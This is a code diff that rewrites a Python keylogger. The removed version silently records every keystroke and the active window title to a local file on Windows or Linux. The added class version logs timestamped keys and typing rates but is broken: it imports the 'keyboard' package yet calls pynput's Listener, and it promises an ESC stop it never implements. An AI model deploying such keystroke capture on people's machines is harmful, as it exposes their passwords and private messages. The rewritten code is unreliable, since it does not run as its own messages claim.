@@ -1,52 +1,61 @@
-from pynput import keyboard
+import keyboard
 import time
+from datetime import datetime
+import os
 import threading
-import platform
 
-if platform.system() == "Windows":
-    import win32gui
-elif platform.system() == "Linux":
-    import subprocess
-
-def get_active_window():
-    try:
-        if platform.system() == "Windows":
-            window = win32gui.GetForegroundWindow()
-            title = win32gui.GetWindowText(window)
-            return title
-        elif platform.system() == "Linux":
-            window = subprocess.check_output(['xdotool', 'getwindowfocus', 'getwindowname'])
-            return window.decode('utf-8').strip()
-        else:
-            return "Unsupported OS"
-    except:
-        return "Unknown Window"
-
-current_window = ""
-
-def track_window_changes():
-    global current_window
-    while True:
-        new_window = get_active_window()
-        if new_window != current_window:
-            current_window = new_window
-            with open("log.txt", "a", encoding="utf-8") as f:
-                f.write(f"\n\n[{current_window}] — {time.ctime()}\n")
-        time.sleep(1)
-
-def on_press(key):
-    try:
-        log = f"{key.char}"
-    except AttributeError:
-        log = f"[{key.name}]"
-    with open("log.txt", "a", encoding="utf-8") as f:
-        f.write(log)
-
-window_thread = threading.Thread(target=track_window_changes)
-window_thread.daemon = True
-window_thread.start()
+class KeyLogger:
+    def __init__(self, log_interval=60):
+        self.count = 0
+        self.log_interval = log_interval  # seconds
+        self.log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        self.running = True
+        self.logger_thread = None
+        
+    def on_press(self, key):
+        self.count += 1
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        log_entry = f"[{timestamp}] Key pressed: {key}\n"
+        
+        with open(self.log_file, "a") as f:
+            f.write(log_entry)
+        
+        print(f"Total keys pressed: {self.count}", end="\r")
     
-listener = keyboard.Listener(on_press=on_press)
-listener.start()
+    def periodic_log(self):
+        """Periodically write statistics to log"""
+        while self.running:
+            time.sleep(self.log_interval)
+            stats = f"[STATS] Keys per second: {self.count/self.log_interval}\n"
+            with open(self.log_file, "a") as f:
+                f.write(stats)
+            self.count = 0
+    
+    def start(self):
+        print(f"Keylogger started... Logging to {self.log_file}")
+        print("Press ESC to stop.")
+        
+        # Start periodic logging thread
+        self.logger_thread = threading.Thread(target=self.periodic_log)
+        self.logger_thread.daemon = True
+        self.logger_thread.start()
+        
+        # Start key listener
+        with keyboard.Listener(on_press=self.on_press) as listener:
+            try:
+                listener.join()
+            except KeyboardInterrupt:
+                pass
+    
+    def stop(self):
+        self.running = False
+        if self.logger_thread:
+            self.logger_thread.join(timeout=1)
+        print("\nKeylogger stopped.")
 
-listener.join()
+if __name__ == "__main__":
+    logger = KeyLogger()
+    try:
+        logger.start()
+    except KeyboardInterrupt:
+        logger.stop()
